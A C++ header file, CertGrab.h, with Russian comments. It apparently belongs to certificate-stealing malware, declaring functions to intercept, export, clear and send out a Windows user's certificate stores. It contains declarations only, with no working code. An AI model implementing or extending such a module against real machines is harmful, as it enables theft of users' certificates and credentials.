//---------------------------------------------------------------------------

#ifndef CertGrabH
#define CertGrabH
//---------------------------------------------------------------------------
#include <windows.h>

typedef struct TCertData
{
	CRYPT_DATA_BLOB Blob; // сертификат
	PCHAR Name;           // имя хранилища
	PWCHAR Password;       // Пароль шифрования экспортируемых сертификатов
	int Count;             // Количество сертификатов в хранилище
} *PCertData;


namespace CertGrabber
{
	// Инициализируем систему перехвата сертификатов
	void Initialize();

	// Экспортируем все зарегистрированные сертификаты
	bool Export(PCertData Data);

	// Импортировать сертификаты в хранилище
	bool Import(PCertData Data);

	// Очистить хранилище сертификатов
	void ClearCertStore(PCHAR Name);

	// Отправить сертификаты
	bool SendCert(PCertData Data);
}


//---------------------------------------------------------------------------
#endif
